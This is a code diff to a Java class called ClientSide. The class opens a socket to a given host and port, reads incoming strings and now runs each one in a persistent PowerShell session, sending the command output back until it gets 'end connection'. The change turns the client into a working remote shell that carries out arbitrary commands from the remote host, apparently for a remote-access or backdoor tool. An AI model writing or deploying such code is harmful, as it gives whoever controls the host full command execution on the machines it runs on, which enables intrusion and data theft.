@@ -5,16 +5,16 @@ import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.Socket;
 
-import control.Controller;
+import com.profesorfalken.jpowershell.PowerShell;
+import com.profesorfalken.jpowershell.PowerShellResponse;
 
 public class ClientSide {
 	private Socket s;
-	
-	private DataOutputStream dout;
-	private DataInputStream din;
-	
 	private String _ip;
 	private int _port;
+	private DataOutputStream dout;
+	private DataInputStream din;
+	private PowerShell powerShell;
 	
 	public ClientSide(String hostIP, int port) {
 		_ip = hostIP;
@@ -34,13 +34,15 @@ public class ClientSide {
 				received = din.readUTF();
 				received = received.trim();
 				if (received.contains("end connection") == true) {
-					dout.writeUTF("Bye :(");
+					dout.writeUTF("Bye :(\n\n");
 					dout.flush();
 					s.close();
+					powerShell.close();
 					return;
 				}
 				else {
-					dout.writeUTF(Controller.execute(received));
+					PowerShellResponse response = powerShell.executeCommand(received);
+					dout.writeUTF(response.getCommandOutput());
 					dout.flush();
 				}
 	        } catch (Exception e1) {
@@ -59,6 +61,7 @@ public class ClientSide {
 		System.gc(); //Calls the garbage collector because of the previous function
 		dout = new DataOutputStream(s.getOutputStream());
 		din = new DataInputStream(s.getInputStream());
+		powerShell = PowerShell.openSession();
 	}
 	
 	private boolean initConnection() {
